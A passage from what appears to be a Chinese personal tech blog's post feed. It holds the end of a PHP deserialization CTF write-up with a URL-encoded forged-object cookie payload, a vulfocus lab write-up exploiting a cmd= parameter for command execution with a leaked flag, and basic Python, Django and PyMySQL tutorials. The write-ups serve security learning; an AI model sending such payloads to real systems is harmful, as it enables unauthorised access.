<span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>与 level 2 相似 注意 超全局变量 $_COOKIE ，通过cookie 传参传入 payload ，同时进行一下url编码</p><p>payload：</p><blockquote><p>O%3a7%3a%22mylogin%22%3a2%3a%7bs%3a4%3a%22user%22%3bs%3a8%3a%22daydream%22%3bs%3a4%3a%22pass%22%3bs%3a2%3a%22ok%22%3b%7d</p></blockquote><p>未完待续。。。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulfocus|命令执行漏洞WP</title>
      <link href="/posts/83c1bda7/"/>
      <url>/posts/83c1bda7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-运行环境"><a href="#1-运行环境" class="headerlink" title="1.运行环境"></a>1.运行环境</h1><p>进入首页 返回 index.php?cmd&#x3D;ls &#x2F;tmp</p><h1 id="2-将其拼接到浏览器-url-栏后面"><a href="#2-将其拼接到浏览器-url-栏后面" class="headerlink" title="2.将其拼接到浏览器 url 栏后面"></a>2.将其拼接到浏览器 url 栏后面</h1><p>发现输出了一段文字，但是看的不是很明显，CTRL+U 查看页面源代码</p><p>发现有两行东西，这就说明这个目录下面就一个index.php 文件</p><p>推测执行了 ls 系统命令</p><h1 id="3-替换其他指令查找-flag"><a href="#3-替换其他指令查找-flag" class="headerlink" title="3.替换其他指令查找 flag"></a>3.替换其他指令查找 flag</h1><p>执行下列命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;*flag*&#x27;</span><br></code></pre></td></tr></table></figure><p>获得flag</p><p>flag-{bmh8bd27630-a4fd-4bfa-a7c8-61af1a1f0f0b}</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Django开发</title>
      <link href="/posts/2bf21027/"/>
      <url>/posts/2bf21027/</url>
      
        <content type="html"><![CDATA[<h1 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h1><ul><li>创建 env 环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m venv <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><ul><li>启动虚拟环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./env/Scripts/activate<br></code></pre></td></tr></table></figure><h1 id="运行第一个-Django-程序"><a href="#运行第一个-Django-程序" class="headerlink" title="运行第一个 Django 程序"></a>运行第一个 Django 程序</h1><ul><li>安装 django 库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install django<br></code></pre></td></tr></table></figure><ul><li>初始化 django 项目</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">django-admin startproject website<br></code></pre></td></tr></table></figure><ul><li>启动 django 项目</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ./website/manage.py runserver<br></code></pre></td></tr></table></figure><ul><li>切换端口号</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python manage.py runserver 8888<br></code></pre></td></tr></table></figure><h2 id="修改首页并输出-Hello-world"><a href="#修改首页并输出-Hello-world" class="headerlink" title="修改首页并输出 Hello world"></a>修改首页并输出 Hello world</h2><ul><li>在根目录下新建 views.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># views.py</span><br><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>  <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;Hello world&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>修改 urls.py 文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#urls.py</span><br><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> views   <span class="hljs-comment">#导入 views.py </span><br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, admin.site.urls),<br>    path(<span class="hljs-string">&#x27;&#x27;</span>,views.index,name=<span class="hljs-string">&quot;asd&quot;</span>), <br>]<br></code></pre></td></tr></table></figure><h1 id="django-admin-命令详解"><a href="#django-admin-命令详解" class="headerlink" title="django-admin 命令详解"></a>django-admin 命令详解</h1><ul><li>查看 django-admin 提供的所有命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">django-admin <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h2 id="创建新项目"><a href="#创建新项目" class="headerlink" title="创建新项目"></a>创建新项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">django-admin startproject<br></code></pre></td></tr></table></figure><p>在当前目录下创建一个新的django项目，包括最基本的目录</p><ul><li>项目名称 &#x2F;: 项目主目录<ul><li>__init__ .py</li><li>settings.py 配置文件</li><li>urls.py : URL路由配置</li><li>wsgi.py ：WSGI 应用入口</li></ul></li></ul><h2 id="创建新应用"><a href="#创建新应用" class="headerlink" title="创建新应用"></a>创建新应用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pyhon">django-admin startapp 应用名称<br></code></pre></td></tr></table></figure><p>创建一个新的 django 应用，包含：</p><ul><li>migrations&#x2F;：数据库迁移文件目录</li><li><em>_init</em>_.py</li><li>admin.py：管理后台配置</li><li>apps.py：应用配置</li><li>models.py：数据库模型定义</li><li>tests.py：测试代码</li><li>views.py：试图函数</li></ul><h2 id="检查项目配置"><a href="#检查项目配置" class="headerlink" title="检查项目配置"></a>检查项目配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">django-admin check<br></code></pre></td></tr></table></figure><p>这个命令会检查 django 项目是否有配置错误，包括：</p><ul><li>模型定义是否正确</li><li>url 配置是否有效</li><li>模板设置是否正确</li><li>静态文件配置等</li></ul><h2 id="数据库迁移"><a href="#数据库迁移" class="headerlink" title="数据库迁移"></a>数据库迁移</h2><p>django 使用迁移系统来管理数据库模式变更</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">django-admin makemigrations <span class="hljs-comment"># 创建迁移文件</span><br>django-admin migrate        <span class="hljs-comment"># 应用迁移到数据库</span><br></code></pre></td></tr></table></figure><h2 id="创建超级用户"><a href="#创建超级用户" class="headerlink" title="创建超级用户"></a>创建超级用户</h2><blockquote><p>引导用户创建一个可以访问django 管理后台的超级用户</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">django-admin createsuperuser<br></code></pre></td></tr></table></figure><h1 id="django-admin-常用命令"><a href="#django-admin-常用命令" class="headerlink" title="django-admin 常用命令"></a>django-admin 常用命令</h1><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>startproject</td><td>创建一个新的django项目</td></tr><tr><td>startapp</td><td>创建一个新的django应用</td></tr><tr><td>runserver</td><td>启动开发服务器</td></tr><tr><td>makemigrations</td><td>生成数据库迁移文件</td></tr><tr><td>migrate</td><td>执行数据库迁移</td></tr><tr><td>shell</td><td>启动 django 交互式shell</td></tr><tr><td>collectstatic</td><td>收集静态文件（用于生产环境）</td></tr><tr><td>test</td><td>运行单元测试</td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python创建env虚拟环境</title>
      <link href="/posts/3b86160f/"/>
      <url>/posts/3b86160f/</url>
      
        <content type="html"><![CDATA[<h1 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m venv <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><h1 id="启动虚拟环境"><a href="#启动虚拟环境" class="headerlink" title="启动虚拟环境"></a>启动虚拟环境</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./env/scripts/activate<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PyMySQL</title>
      <link href="/posts/db284c9b/"/>
      <url>/posts/db284c9b/</url>
      
        <content type="html"><![CDATA[<h1 id="安装-PyMySQL"><a href="#安装-PyMySQL" class="headerlink" title="安装 PyMySQL"></a>安装 PyMySQL</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install PyMySQL<br></code></pre></td></tr></table></figure><h1 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h1><blockquote><p>开启 mysql 地址为 localhost:3306 用户名为 root 密码为 root</p></blockquote><ul><li>创建数据库连接</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br>dbconn = pymysql.connect(<br>  host=<span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  user=<span class="hljs-string">&#x27;root&#x27;</span>,<br>  password=<span class="hljs-string">&#x27;root&#x27;</span>,<br>  database=<span class="hljs-string">&#x27;test&#x27;</span><br>)<br></code></pre></td></tr></table></figure><ul><li>使用 cursor() 方法创建一个游标对象 cursor</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cursor = dbconn.cursor()<br></code></pre></td></tr></table></figure><ul><li>使用 excute() 方法执行sql查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cursor.excute(<span class="hljs-string">&quot;select user()&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>使用 fetchone() 方法获取一条数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = cursor.fetchone()<br></code></pre></td></tr></table></figure><ul><li>关闭数据库连接</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dbconn.close()<br></code></pre></td></tr></table></figure><ul><li>创建数据表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">import</span> pymysql<br> <br><span class="hljs-comment"># 打开数据库连接</span><br>db = pymysql.connect(host=<span class="hljs-string">&#x27;localhost&#x27;</span>,<br>                     user=<span class="hljs-string">&#x27;testuser&#x27;</span>,<br>                     password=<span class="hljs-string">&#x27;test123&#x27;</span>,<br>                     database=<span class="hljs-string">&#x27;TESTDB&#x27;</span>)<br> <br><span class="hljs-comment"># 使用 cursor() 方法创建一个游标对象 cursor</span><br>cursor = db.cursor()<br> <br><span class="hljs-comment"># 使用 execute() 方法执行 SQL，如果表存在则删除</span><br>cursor.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS EMPLOYEE&quot;</span>)<br> <br><span class="hljs-comment"># 使用预处理语句创建表</span><br>sql = <span class="hljs-string">&quot;&quot;&quot;CREATE TABLE EMPLOYEE (</span><br><span class="hljs-string">         FIRST_NAME  CHAR(20) NOT NULL,</span><br><span class="hljs-string">         LAST_NAME  CHAR(20),</span><br><span class="hljs-string">         AGE INT,  </span><br><span class="hljs-string">         SEX CHAR(1),</span><br><span class="hljs-string">         INCOME FLOAT )&quot;&quot;&quot;</span><br> <br>cursor.execute(sql)<br> <br><span class="hljs-comment"># 关闭数据库连接</span><br>db.close()<br></code></pre></td></tr></table></figure><h1 id="使用预处理方法防止SQL注入"><a href="#使用预处理方法防止SQL注入" class="headerlink" title="使用预处理方法防止SQL注入"></a>使用预处理方法防止SQL注入</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">import</span> pymysql<br> <br><span class="hljs-comment"># 打开数据库连接</span><br>db = pymysql.connect(host=<span class="hljs-string">&#x27;localhost&#x27;</span>,<br>                     user=<span class="hljs-string">&#x27;testuser&#x27;</span>,<br>                     password=<span class="hljs-string">&#x27;test123&#x27;</span>,<br>                     database=<span class="hljs-string">&#x27;TESTDB&#x27;</span>)<br> <br><span class="hljs-comment"># 使用 cursor() 方法创建一个游标对象 cursor</span><br>cursor = db.cursor()<br> <br>sql = <span class="hljs-string">&#x27;SELECT * FROM user where username = %s&#x27;</span><br> <br>cursor.execute(sql,(username,))<br><br><span class="hljs-comment"># 关闭数据库连接</span><br>db.close()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表、元组、字典、集合</title>
      <link href="/posts/df8caf15/"/>
      <url>/posts/df8caf15/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><ul><li>序列类型：列表、元组、字符串</li><li>映射类型：字典</li><li>集合类型：集合、冻结集合</li></ul><h1 id="列表-List"><a href="#列表-List" class="headerlink" title="列表 (List)"></a>列表 (List)</h1><blockquote><p>列表是Python中最灵活的有序的集合类型</p></blockquote><h2 id="列表的基本特性"><a href="#列表的基本特性" class="headerlink" title="列表的基本特性"></a>列表的基本特性</h2><ul><li>有序的集合，元素按照插入的顺序排列</li><li>可变，可以修改内容</li><li>可以包含任意类型的对象 , 可以嵌套使用</li><li>使用方括号[]，元素之间用逗号分隔</li></ul><p>eg :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">123</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-number">1.2</span>,<span class="hljs-number">1e10</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]]<br></code></pre></td></tr></table></figure><h2 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h2><blockquote><p>列表实际上是一个动态数组，而不是链表</p><p>列表在内存中分配的空间通常比实际需要的多，这是为了优化追加的操作</p><p>平均世间复杂度为o(1)</p><p>列表元素在内存中不连续存储，列表只存储指向各个元素的指针</p></blockquote><h2 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h2><ul><li>普通方式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br><span class="hljs-built_in">list</span>.append(i)<br></code></pre></td></tr></table></figure><ul><li>推导式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br><span class="hljs-comment">##带有条件的情况</span><br><span class="hljs-built_in">list</span> = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><h2 id="列表的输出"><a href="#列表的输出" class="headerlink" title="列表的输出"></a>列表的输出</h2><blockquote><p>与字符串的索引一样，列表索引从0开始，第二个索引为1，最后一个元素的索引也可以是-1</p></blockquote><ul><li>直接输出</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br></code></pre></td></tr></table></figure><ul><li>访问列表中的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><ul><li>截取字符串</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>])<br></code></pre></td></tr></table></figure><h2 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h2><blockquote><p>使用 append() 方法</p></blockquote><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">list</span>.append(<span class="hljs-number">7</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br></code></pre></td></tr></table></figure><h2 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h2><blockquote><ol><li>使用del语句</li><li>使用 remove() 方法</li><li>使用 pop() 方法</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">list</span>.pop(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">del</span> <span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">list</span>.remove(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br></code></pre></td></tr></table></figure><h2 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h2><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>len([1,2,3])</td><td>长度</td></tr><tr><td>[1,2,3]+[4,5,6]</td><td>组合</td></tr><tr><td>[1]*4</td><td>重复</td></tr><tr><td>3 in [1,2,3]</td><td>元素是否存在列表中</td></tr><tr><td>for x in [1,2,3]:print(x,end&#x3D;” “)</td><td>迭代</td></tr></tbody></table><h2 id="列表常用函数-方法"><a href="#列表常用函数-方法" class="headerlink" title="列表常用函数&amp;方法"></a>列表常用函数&amp;方法</h2><ul><li>python 包含一下函数</li></ul><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>len()</td><td>列表元素个数</td></tr><tr><td>max()</td><td>返回最大值</td></tr><tr><td>min()</td><td>返回最小值</td></tr><tr><td>list(seq)</td><td>将元组转换为列表</td></tr></tbody></table><ul><li>python 包含以下方法</li></ul><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>list.append()</td><td>在列表末尾追加新的对象</td></tr><tr><td>list.count()</td><td>统计某个元素在列表中出现的次数</td></tr><tr><td>list.extend()</td><td>在列表末尾一次性追加另一个序列中的多个值</td></tr><tr><td>list.index()</td><td>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>list.insert(index, obj)</td><td>将对象插入列表</td></tr><tr><td>list.pop()</td><td>移除列表中第一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>list.remove()</td><td>移除列表中某个值的第一个匹配项</td></tr><tr><td>list.reverse()</td><td>反向列表中的元素</td></tr><tr><td>list.sort(key&#x3D;None,reverse&#x3D;False)</td><td>对列表进行排序</td></tr><tr><td>list.clear()</td><td>清空列表</td></tr><tr><td>list.copy()</td><td>复制</td></tr></tbody></table><h1 id="元组（Tuple）"><a href="#元组（Tuple）" class="headerlink" title="元组（Tuple）"></a>元组（Tuple）</h1><blockquote><p>元组与列表类似，不同之处在于元组的元素不能修改</p><p>元组使用 () 小括号，列表使用方括号 []</p><p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开</p></blockquote><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;baidu&quot;</span>,<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;bing&quot;</span>)<br></code></pre></td></tr></table></figure><p>创建空元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = ()<br></code></pre></td></tr></table></figure><blockquote><p>注意：当元组中只包含一个元素时，需要在元素后面加逗号. 否则括号会被当做运算符使用</p></blockquote><h2 id="访问元组"><a href="#访问元组" class="headerlink" title="访问元组"></a>访问元组</h2><p>和列表一样，元组可以使用下标索引来访问元组中的值</p><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;baidu&quot;</span>,<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;bing&quot;</span>)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tup1[0]: &quot;</span>, tup1[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h2 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h2><blockquote><p>元组中的元素是不允许被修改的，但是可以对元组进行连接组合</p></blockquote><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>tup2 = (<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#tup1[0]=0  这种操作是非法的</span><br><br>tup3 = tup1 + tup2<br></code></pre></td></tr></table></figure><h2 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h2><blockquote><p>元组中的元素值不允许被删除，但是可以使用del 语句来删除整个元组</p></blockquote><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;baidu&quot;</span>,<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;bing&quot;</span>)<br><span class="hljs-keyword">del</span> tup1<br></code></pre></td></tr></table></figure><h2 id="元组的运算"><a href="#元组的运算" class="headerlink" title="元组的运算"></a>元组的运算</h2><blockquote><p>与字符串一样，元组之间可以使用 +、+&#x3D;、*号进行运算</p></blockquote><p>eg： 复制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-string">&quot;asd&quot;</span>,)*<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h2 id="元组的内置函数"><a href="#元组的内置函数" class="headerlink" title="元组的内置函数"></a>元组的内置函数</h2><blockquote><p>基本和列表相同，不再赘述</p></blockquote><p>计算个数、最大值、最小值</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>tuple(iterable)</td><td>将可迭代系列转换为元组</td></tr></tbody></table><h1 id="字典（Dict）"><a href="#字典（Dict）" class="headerlink" title="字典（Dict）"></a>字典（Dict）</h1><blockquote><p>字典是另一种可变容器模型，且可存储任意类型对象</p><p>字典的每个键值 key&#x3D;&gt;value 用冒号:分割，每个对之间用逗号分隔，整个字典包括在花括号中</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意：dict作为python的关键字和内置函数，变量名不建议命名为dict</p></blockquote><p>键 必须是唯一的，但值不必</p><p>值可以取任何数据类型，但键必须是不可变的，如字符串，数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tinydict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;likes&#x27;</span>: <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-string">&#x27;www.runoob.com&#x27;</span>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="创建空字典"><a href="#创建空字典" class="headerlink" title="创建空字典"></a>创建空字典</h2><ul><li>使用花括号 {} 创建空字典</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">emptyDict = &#123;&#125;<br></code></pre></td></tr></table></figure><ul><li>使用内置函数 dict() 创建空字典</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 